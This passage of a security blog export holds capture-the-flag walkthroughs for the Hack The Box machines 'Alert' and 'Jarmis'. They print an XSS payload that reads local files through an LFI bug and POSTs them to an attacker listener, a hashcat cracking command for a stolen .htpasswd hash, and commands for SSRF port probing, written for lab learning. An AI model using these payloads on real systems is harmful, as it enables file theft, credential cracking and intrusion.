
[{"content":" Reconnaissance \u0026amp; Enumeration # Started with an Nmap scan, revealing open ports: 22, 80. From the scan results I can also see 12227 port open which is also interesting. The scan results showed that Apache2 was hosting the website. The website featured a markdown reader page, The Basic functionality of this website is, get\u0026rsquo;s markdown file from the user and then reads the contents of the particular file for displaying it\u0026rsquo;s contents on the website. This website also included a share option for the rendered content. Again, it also has a simple contact form Now it should be obivious that this website uses HTML and JavaScript to render the contents like any other site on the internet I uploaded a .md file with JavaScript snippet init for testing, below were the contents of my md file\nAs expected the contents were rendered and loaded like this This is quite bad. It can execute arbitrary code as it renders the contents Exploitation # Also another functionality in this website is pretty straight forward, where in contact form whatever link is filled and sent seems to be clicked by an admin. We can easily get the admin\u0026rsquo;s cookie by making a .md file with malicious payload and by sharing the .md file link using the share option to the admin through the contact form. The admin will eventually click the link and it will make the code to execute on his browser potentially sending the cookie to us(Attacker). More dangerously we could also read arbitrary files using the message.php parameter So to exploit this LFI vulnerability I tried this payload and opened a nc on other side. \u0026lt;script\u0026gt; fetch(\u0026#34;http://alert.htb/messages.php?file=/etc/passwd\u0026#34;).then(response =\u0026gt; response.text()) .then(data =\u0026gt; fetch(\u0026#34;http://10.10.14.12:6001\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: data })); \u0026lt;/script\u0026gt; To trigger this payload, View it and use the share option and get the link, share it to the dumb admin via contact form. After many tries I got this correct I modified the payload accordingly to read the target file \u0026lt;script\u0026gt; fetch(\u0026#34;http://alert.htb/messages.php?file=../../../../../../etc/passwd\u0026#34;).then(response =\u0026gt; response.text()) .then(data =\u0026gt; fetch(\u0026#34;http://10.10.14.12:6001\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: data })); \u0026lt;/script\u0026gt; Found couple of users. Now the configs for apache2 running websites generally resides at /etc/apache2/sites-available/000-default.conf I learnt this from enumerating my own machine. After I modified the original payload to read this configuration file and I got the output. Got the .htpasswd location. Usually this file contains the passwords or hashes for apache2. Within that file password hash for user albert was there\nLet\u0026rsquo;s crack the hash I used hashcat to crack this hash hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 1600 --username Here I specified module 1600 to crack apache type hash and with as albert username is presented with the hash we have to specify --username flag Now I can use ssh to login as user albert We got the User flag Privilege Escalation # General SUID, SGID, Capabilities didn\u0026rsquo;t had anything promising But anyway there was a internal web service running on port 80 ss -tunlp so I tunneled it to my machine via ssh on port 2000. ssh -L 2000:localhost:8080 albert@alert.Hack The Box The web service name litterely websitemonitor which track and monitor the websites like alert.htb I found the website\u0026rsquo;s directory location at /opt/websitemonitor The configuration files for this website are stored within /config The the web root folder of this website has root privileges and Albert also have access to modify it. So to escalate my privileges I changed the file to a reverseshell. Eventually secured Root flag Summary # The \u0026ldquo;Alert\u0026rdquo; box was approached with an initial reconnaissance phase where an nmap scan revealed three open ports: SSH (port 22) and a web server (port 80). The web server was identified as running Apache2 and hosting a Markdown reader page.\nDuring the enumeration phase, it was discovered that the Markdown reader could execute code embedded within the Markdown content. Additionally, a contact form was found to be exploitable because the administrator would click on links sent through it without analyzing them, suggesting a potential Local File Inclusion (LFI) vulnerability. This LFI was exploited by crafting a payload and sending it to the admin via the contact form. This allowed for the discovery of user information and the location of the Apache2 configuration file, which contained the path to the .htpasswd file. The password hash for the user albert was found within this file.\nThe exploitation phase also involved cracking albert\u0026rsquo;s password hash using hashcat. The cracked password enabled successful SSH login, granting initial user access and the user flag.\nFor privilege escalation, an internal web service named \u0026ldquo;websitemonitor\u0026rdquo; was discovered running on port 8080. This port was tunneled to the attacker\u0026rsquo;s machine via SSH. The configuration files for \u0026ldquo;websitemonitor,\u0026rdquo; including the web root, were located in /opt/websitemonitor/config. As the user albert and root had permissions to modify files in the web directory,I replaced a file with a reverse shell, leading to root access and the acquisition of the root flag.\n","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1742495783286-alert-walkthroughhtb/","section":"Posts","summary":"","title":"Alert Walkthrough(Hack The Box)","type":"posts"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/easy/","section":"Tags","summary":"","title":"Easy","type":"tags"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/hack-the-box/","section":"Tags","summary":"","title":"Hack the Box","type":"tags"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/hacking/","section":"Tags","summary":"","title":"Hacking","type":"tags"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/","section":"Secure The Throne","summary":"","title":"Secure The Throne","type":"page"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/walkthrough/","section":"Tags","summary":"","title":"Walkthrough","type":"tags"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"","date":"20 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/hard/","section":"Tags","summary":"","title":"Hard","type":"tags"},{"content":" About # Jarmis is a hard rated Linux machine. The port scan reveals SSH and web-server running on the box. The web-server is hosting an API service, which fetches the JARM signature of the queried server. This API service also labels the queried JARM signature as malicious if the corresponding entry is present in its database. We can then leverage this API service to exploit an SSRF vulnerability and determine the internal open ports of the remote host, which reveal the OMI (Open Management Infrastructure) service running on one of them. The OMI service is vulnerable to the OMIgod remote code execution vulnerability. OMIgod can be exploited by redirecting the API requests using a custom Flask server and making use of a Gopher URL, trigger an SSRF POST request to the remote server along with a reverse shell payload and obtain a root shell.\nReconnaissance \u0026amp; Enumeration # Nmap scan results: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Jarmis |_http-favicon: Unknown favicon MD5: C92B85A5B907C70211F4EC25E29A8C4A |_http-server-header: nginx/1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.19 Uptime guess: 1.433 days (since Thu Mar 13 07:56:57 2025) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=265 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 995/tcp) HOP RTT ADDRESS 1 391.17 ms 10.10.14.1 2 391.18 ms 10.10.11.117 The scan looks normal, with usual order of a web port and ssh port. From loading and looking at the favicon itself I can tell that this a react page The root page looks static, it\u0026rsquo;s showing loading for a while now so I fired up ffuf for directory enumeration. Quickly ffuf finds couple of endpoints ‚ùØ ffuf -u http://10.10.11.117/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 60 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.117/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 60 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ api [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 266ms] docs [Status: 200, Size: 967, Words: 195, Lines: 31, Duration: 267ms] favicon.ico [Status: 200, Size: 3870, Words: 16, Lines: 13, Duration: 273ms] index.html [Status: 200, Size: 2254, Words: 67, Lines: 1, Duration: 278ms] robots.txt [Status: 200, Size: 67, Words: 3, Lines: 4, Duration: 276ms] static [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 262ms] :: Progress: [4744/4744] :: Job [1/1] :: 214 req/sec :: Duration: [0:00:22] :: Errors: 0 :: /docs gets me to API documentation as I expected Let\u0026rsquo;s test each endpoint one by one. The first endpoint api/v1/search/id/{jarm_id} takes an integer as input so I provided a random number and got a signature back as json data in the response Testing the endpoints # Endpoint-1 - This is the curl command\ncurl \u0026#39;http://10.10.11.117/api/v1/search/id/3\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq Apparently the output may look like this { \u0026#34;id\u0026#34;: 3, \u0026#34;sig\u0026#34;: \u0026#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;151.101.193.140:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;reddit.com\u0026#34; } Endpoint-2 - Endpoint 2 is api/v1/search/signature/?keyword=\u0026lt;SIG\u0026gt;\u0026amp;max_results=10 takes string value as input - So when I input that signature from endpoint-1(Previous) it gives results.\ncurl \u0026#39;http://10.10.11.117/api/v1/search/signature/?keyword=29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026amp;max_results=10\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq Response: { \u0026#34;results\u0026#34;: [ { \u0026#34;id\u0026#34;: 3, \u0026#34;sig\u0026#34;: \u0026#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;151.101.193.140:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;reddit.com\u0026#34; }, { \u0026#34;id\u0026#34;: 67, \u0026#34;sig\u0026#34;: \u0026#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;151.101.129.140:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;reddit.com\u0026#34; }, { \u0026#34;id\u0026#34;: 87, \u0026#34;sig\u0026#34;: \u0026#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;185.199.111.153:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;panda.tv\u0026#34; }, { \u0026#34;id\u0026#34;: 92, \u0026#34;sig\u0026#34;: \u0026#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;151.101.65.111:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;theguardian.com\u0026#34; }, { \u0026#34;id\u0026#34;: 108, \u0026#34;sig\u0026#34;: \u0026#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;151.101.194.132:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;thestartmagazine.com\u0026#34; }, { \u0026#34;id\u0026#34;: 131, \u0026#34;sig\u0026#34;: \u0026#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;151.101.2.137:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;wikihow.com\u0026#34; } ] } The results are odd anyway lets move on to next endpoint which should be the last one in the list Endpoint-3 - This endpoint itself interesting as it ends in /fetch and takes a string as input. This is the full endpoint /api/v1/fetch\nThi endpoint is promising so to test this I tried to hit back my host through this endpoint, First I spawned a nc listener and requested via this endpoint like this curl \u0026#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18%3A6001\u0026#39; -H \u0026#39;accept: application/json\u0026#39; The reflection on nc my listener looks rather interesting cause, hmm\u0026hellip;look at this ‚ùØ nc -lnvp 6001 listening on [any] 6001 ... connect to [10.10.14.18] from (UNKNOWN) [10.10.11.117] 42834 ÔøΩÔøΩÔøΩÔøΩÔøΩ\u0026amp;ÔøΩso*ÔøΩzÔøΩE_9lÔøΩsÔøΩe|ÔøΩÔøΩKg8 uÔøΩ ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩZ1IÔøΩWv„ù±8ÔøΩn1GÔøΩÔøΩÔøΩÔøΩ3gÔøΩÔøΩÔøΩÔøΩÔøΩ9kÔøΩÔøΩÔøΩÔøΩÔøΩEÔøΩÔøΩÔøΩÔøΩÔøΩ\tÔøΩ#ÔøΩÔøΩÔøΩÔøΩÔøΩ+ÔøΩ ÔøΩ$ÔøΩÔøΩÔøΩÔøΩÔøΩ,ÔøΩrÔøΩsÃ©ÔøΩÔøΩÔøΩÔøΩÔøΩ\u0026#39;ÔøΩ/ÔøΩÔøΩ(ÔøΩ0ÔøΩ`ÔøΩaÔøΩvÔøΩwÃ®ÔøΩÔøΩ /\u0026lt;ÔøΩÔøΩÔøΩÔøΩÔøΩ5=ÔøΩÔøΩÔøΩÔøΩÔøΩAÔøΩÔøΩÔøΩÔøΩ 10.10.14.18ÔøΩ 3\u0026amp;$ ÔøΩÔøΩÔøΩÔøΩÔøΩ}LÔøΩ)z/3ÔøΩÔøΩ7ÔøΩUÔøΩ’çÔøΩ4ÔøΩQÔøΩxIÔøΩÔøΩÔøΩ-+% This looks like an encrypted value to me, it could be a certificate or handshake but something encrypted that\u0026rsquo;s for sure so I fired up a listener with ssl Typical nc(NetCat) may give errors cause by default nc doesn\u0026rsquo;t support SSL so I installed ncat with sudo apt-get install ncat then used this command to get a listener with ssl. definition \u0026ldquo;ncat\u0026rdquo; is a modern reimplementation of the venerable Netcat, developed by the Nmap Project, and is a flexible tool for reading, writing, redirecting, and encrypting data across a network, often used for security testing and administration tasks ncat --ssl -lnvp 443 Now the connection just cuts off after two seconds, Which is weird ‚ùØ ncat --ssl -lnvp 443 Ncat: Version 7.95 ( https://nmap.org/ncat ) Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one. Ncat: SHA-1 fingerprint: 0362 8FEE A32F 8320 7092 B6DC BA81 43C8 A83F 4CB5 Ncat: Listening on [::]:443 Ncat: Listening on 0.0.0.0:443 Ncat: Connection from 10.10.11.117:47406. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading I got this as my response from this request which is different in compared to previous one { \u0026#34;sig\u0026#34;: \u0026#34;21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;10.10.14.18:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Ncat?\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } Understanding JARM # Before we move onto the next we have to learn about JARM Definition JARM (or JARM fingerprinting) is an active Transport Layer Security (TLS) server fingerprinting tool developed by Salesforce that helps identify and group servers based on their TLS configuration, potentially revealing malicious servers or malware command and control (C2) infrastructure\nThis article goes in-depth with JARM but the bottom line is, JARM works by actively sending 10 TLS Client Hello packets to a target TLS server and capturing specific attributes of the TLS Server Hello responses. The aggregated TLS server responses are then hashed in a specific way to produce the JARM fingerprint.\nMy guess here is the response signature that I got must be from the first request out of the ten intended ones NetCat should\u0026rsquo;ve allowed only one connection, I can change it allow multiple connections by including the -k flag.\nNow I actually got ten connections in the logs\n‚ùØ ncat --ssl -lnvkp 443 Ncat: Version 7.95 ( https://nmap.org/ncat ) Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one. Ncat: SHA-1 fingerprint: 0293 5838 F917 921F 69AB 00DB 4768 FC73 813C 4488 Ncat: Listening on [::]:443 Ncat: Listening on 0.0.0.0:443 Ncat: Connection from 10.10.11.117:47618. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Ncat: Connection from 10.10.11.117:47620. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Ncat: Connection from 10.10.11.117:47622. Ncat: Failed SSL connection from 10.10.11.117: error:0A0000C1:SSL routines::no shared cipher Ncat: Connection from 10.10.11.117:47624. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Ncat: Connection from 10.10.11.117:47626. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Ncat: Connection from 10.10.11.117:47628. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Ncat: Connection from 10.10.11.117:47634. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Ncat: Connection from 10.10.11.117:47636. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Ncat: Connection from 10.10.11.117:47640. Ncat: Failed SSL connection from 10.10.11.117: error:0A0000C1:SSL routines::no shared cipher Ncat: Connection from 10.10.11.117:47642. Ncat: Failed SSL connection from 10.10.11.117: error:0A00006C:SSL routines::bad key share The response from this also looks weird, now the response has different looking signature than the previous ones: ‚ùØ curl \u0026#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 122 100 122 0 0 15 0 0:00:08 0:00:07 0:00:01 27 { \u0026#34;sig\u0026#34;: \u0026#34;21d19d00021d21d21c42d43d0000007abc6200da92c2a1b69c0a56366cbe21\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;10.10.14.18:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;10.10.14.18\u0026#34; } This is the response from single connection: ‚ùØ curl \u0026#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 148 100 148 0 0 28 0 0:00:05 0:00:05 --:--:-- 39 { \u0026#34;sig\u0026#34;: \u0026#34;21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;10.10.14.18:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Ncat?\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } This the response from the first(From normal NetCat) or non-TLS listener: ‚ùØ curl \u0026#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18%3A6001\u0026#39; -H \u0026#39;accept: application/json\u0026#39; {\u0026#34;sig\u0026#34;:\u0026#34;00000000000000000000000000000000000000000000000000000000000000\u0026#34;,\u0026#34;endpoint\u0026#34;:\u0026#34;10.10.14.18:6001\u0026#34;,\u0026#34;note\u0026#34;:\u0026#34;10.10.14.18\u0026#34;} We can see the differences clearly. Also in my recent response multiple fields are missing (i.e. server, ismalicious) As my recent response seemed weird I used the Endpoint-1 to check the signature and the response from the request shows that my recent response is not in the database ‚ùØ curl \u0026#39;http://10.10.11.117/api/v1/search/signature/?keyword=21d19d00021d21d21c42d43d0000007abc6200da92c2a1b69c0a56366cbe21\u0026amp;max_results=10\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 14 100 14 0 0 22 0 --:--:-- --:--:-- --:--:-- 22 { \u0026#34;results\u0026#34;: [] } We can see in the previous requests as it made from ncat it shows note value as NCAT? also ismalicious=false which is suspicious, as there could be fields with the value being true. Thankfully we can identify this easily by iterating over all the values in the ID parameter(Endpoint-1). First let us narrow down the values ‚ùØ curl http://10.10.11.117/api/v1/search/id/400 null% Hack The Box/Machines/Jarmis ‚ùØ curl http://10.10.11.117/api/v1/search/id/300 null% Hack The Box/Machines/Jarmis ‚ùØ curl http://10.10.11.117/api/v1/search/id/200 {\u0026#34;id\u0026#34;:200,\u0026#34;sig\u0026#34;:\u0026#34;29d29d00029d29d21c29d29d29d29df3fb741bc8febeb816e400df4c5f2e9e\u0026#34;,\u0026#34;ismalicious\u0026#34;:false,\u0026#34;endpoint\u0026#34;:\u0026#34;176.32.103.205:443\u0026#34;,\u0026#34;note\u0026#34;:\u0026#34;amazon.com\u0026#34;}% So the values should be between 0 to 200 or in along those lines. Now lets get the accurate value Hack The Box/Machines/Jarmis ‚ùØ curl http://10.10.11.117/api/v1/search/id/220 {\u0026#34;id\u0026#34;:220,\u0026#34;sig\u0026#34;:\u0026#34;29d29d00029d29d21c42d43d00041d44609a5a9a88e797f466e878a82e8365\u0026#34;,\u0026#34;ismalicious\u0026#34;:false,\u0026#34;endpoint\u0026#34;:\u0026#34;3.211.157.115:443\u0026#34;,\u0026#34;note\u0026#34;:\u0026#34;netflix.com\u0026#34;}% Hack The Box/Machines/Jarmis ‚ùØ curl http://10.10.11.117/api/v1/search/id/230 null% Hack The Box/Machines/Jarmis ‚ùØ curl http://10.10.11.117/api/v1/search/id/221 {\u0026#34;id\u0026#34;:221,\u0026#34;sig\u0026#34;:\u0026#34;29d3fd00029d29d21c42d43d00041df48f145f65c66577d0b01ecea881c1ba\u0026#34;,\u0026#34;ismalicious\u0026#34;:false,\u0026#34;endpoint\u0026#34;:\u0026#34;35.186.224.25:443\u0026#34;,\u0026#34;note\u0026#34;:\u0026#34;spotify.com\u0026#34;}% Hack The Box/Machines/Jarmis ‚ùØ curl http://10.10.11.117/api/v1/search/id/222 {\u0026#34;id\u0026#34;:222,\u0026#34;sig\u0026#34;:\u0026#34;27d27d27d00027d1dc27d27d27d27d3446fb8839649f251e5083970c44ad30\u0026#34;,\u0026#34;ismalicious\u0026#34;:false,\u0026#34;endpoint\u0026#34;:\u0026#34;47.246.24.234:443\u0026#34;,\u0026#34;note\u0026#34;:\u0026#34;login.tmall.com\u0026#34;}% Hack The Box/Machines/Jarmis ‚ùØ curl http://10.10.11.117/api/v1/search/id/223 null% I got the accurate value which is 222. Now lets perform the enumeration For this I made a simple bash script #!/bin/bash for id_num in {1..222}; do curl -s http://10.10.11.117/api/v1/search/id/$id_num | jq \u0026#39;select(.ismalicious == true)\u0026#39; done This was the output: ‚ùØ ./automation.sh jq: parse error: Invalid numeric literal at line 1, column 7 jq: parse error: Invalid numeric literal at line 1, column 7 { \u0026#34;id\u0026#34;: 95, \u0026#34;sig\u0026#34;: \u0026#34;2ad2ad00000000000043d2ad2ad43dc4b09cccb7c1d19522df9b67bf57f4fb\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;104.24.4.98\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Sliver\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;Apache/2.4.40\u0026#34; } jq: parse error: Invalid numeric literal at line 1, column 7 { \u0026#34;id\u0026#34;: 128, \u0026#34;sig\u0026#34;: \u0026#34;2ad2ad0002ad2ad00042d42d000000ad9bf51cc3f5a1e29eecb81d0c7b06eb\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;185.199.109.153\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;SilentTrinity\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } { \u0026#34;id\u0026#34;: 135, \u0026#34;sig\u0026#34;: \u0026#34;21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;104.24.4.98\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Ncat\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } { \u0026#34;id\u0026#34;: 154, \u0026#34;sig\u0026#34;: \u0026#34;07d14d16d21d21d00042d43d000000aa99ce74e2c6d013c745aa52b5cc042d\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;99.86.230.31\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Metasploit\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;apache\u0026#34; } { \u0026#34;id\u0026#34;: 170, \u0026#34;sig\u0026#34;: \u0026#34;22b22b09b22b22b22b22b22b22b22b352842cd5d6b0278445702035e06875c\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;94.140.114.239\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Trickbot\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;Cowboy\u0026#34; } { \u0026#34;id\u0026#34;: 174, \u0026#34;sig\u0026#34;: \u0026#34;29d21b20d29d29d21c41d21b21b41d494e0df9532e75299f15ba73156cee38\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;192.64.119.215\u0026#34;, \u0026#34;note\u0026#34;: null, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } { \u0026#34;id\u0026#34;: 178, \u0026#34;sig\u0026#34;: \u0026#34;1dd40d40d00040d1dc1dd40d1dd40d3df2d6a0c2caaa0dc59908f0d3602943\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;192.145.239.18\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;AsyncRAT\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } { \u0026#34;id\u0026#34;: 179, \u0026#34;sig\u0026#34;: \u0026#34;2ad2ad0002ad2ad00043d2ad2ad43da5207249a18099be84ef3c8811adc883\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;94.140.114.239\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Sliver\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;Apache/2.4.38\u0026#34; } { \u0026#34;id\u0026#34;: 184, \u0026#34;sig\u0026#34;: \u0026#34;28d28d28d00028d00041d28d28d41dd279b0cf765af27fa62e66d7c8281124\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;51.136.77.112\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Gophish\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;nginx\u0026#34; } { \u0026#34;id\u0026#34;: 197, \u0026#34;sig\u0026#34;: \u0026#34;07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;104.17.237.190\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;CobaltStrike\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } There are like 10 outputs, metasploit looks interesting. Let\u0026rsquo;s see what happens if listened from metasploit. In metasploit select this module auxillary/server/capture/http and then set the port to 443, make SSL to true. Here is the oneliner sudo msfconsole -x \u0026#34;use auxiliary/server/capture/http; set srvport 443; set SSL true; run\u0026#34; Now I curled the fetch endpoint like this and got the note as Metasploit. ‚ùØ curl \u0026#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18\u0026#39; | jq . % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 154 100 154 0 0 18 0 0:00:08 0:00:08 --:--:-- 32 { \u0026#34;sig\u0026#34;: \u0026#34;07d19d12d21d21d07c42d43d000000f50d155305214cf247147c43c0f1a823\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;10.10.14.18:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Metasploit?\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } Metasploit log: msf6 auxiliary(server/capture/http) \u0026gt; [*] Started service listener on 0.0.0.0:443 [*] Server started. [*] HTTP REQUEST 10.10.11.117 \u0026gt; 10.10.14.18:80 GET / Unknown cookies= Testing with SSRF # After a while, I tested the fetch endpoint for SSRF and there is SSRF to local host I can determine the open ports within the internal network with this vulnerability. The responses differ between open and closed, For an example Open Port: ‚ùØ curl \u0026#39;http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:22\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 117 100 117 0 0 128 0 